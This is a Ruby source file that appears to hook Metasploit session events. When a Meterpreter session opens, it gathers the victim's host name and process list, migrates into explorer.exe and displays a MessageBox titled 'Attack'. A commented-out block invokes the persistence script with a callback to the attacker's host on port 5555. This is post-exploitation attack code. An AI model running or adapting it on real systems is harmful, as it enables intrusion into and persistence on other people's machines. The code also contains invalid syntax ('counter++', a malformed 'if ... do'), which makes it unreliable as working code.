require "#{RAILS_ROOT}/script/worker/loader"

class MsfSessionEvent
  include ::Msf::SessionEvent

  #
  # Called when a session is opened.
  #
  def on_session_open(session)
    puts("on_session_open #{session}")
    install_msf(session)
  end

  #
  # Called when a session is closed.
  #
  def on_session_close(session, reason='')
    puts("on_session_close #{session}")
  end

  #
  # Called when the user writes data to a session.
  #
  def on_session_command(session, command)
    puts("on_session_command #{session} #{command}")
  end
end

def install_msf(session)
  thread = Thread.new do
    show_message(session)
  end
end

def show_message(session)
  begin
    puts "show_message"
    counter = 0
    while (!session.ext.dump_alias_tree('client').include?('client.priv') || !session.ext.dump_alias_tree('client').include?('client.stdapi'))
    puts "show_message: #{session.ext.dump_alias_tree('client')}"
      counter++
      if (counter == 10) do
        return
      end
      sleep(1)
    end
    puts "show_message start"
    host_name = session.sys.config.sysinfo['Computer']
    processes = session.sys.process.get_processes

#    script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
#    lhost = Rex::Socket.source_address(rhost);
#    args = "run persistence -S -i 5 -p 5555 -r #{lhost}"
#    session.execute_file(script_paths, args)

    pid = nil
    processes.each { |ent|
      if ent['name'] == "explorer.exe"
        pid = ent['pid']
      end
    }
    if not pid == nil
      session.core.migrate(pid)
      result = session.railgun.user32.MessageBoxA(0, "This is new. \nYour host name is: " + host_name, "Attack", "MB_OK")
    end
  rescue ::Exception
    puts(" >> show_message exception: #{$!} #{$!.backtrace}")
  end
end
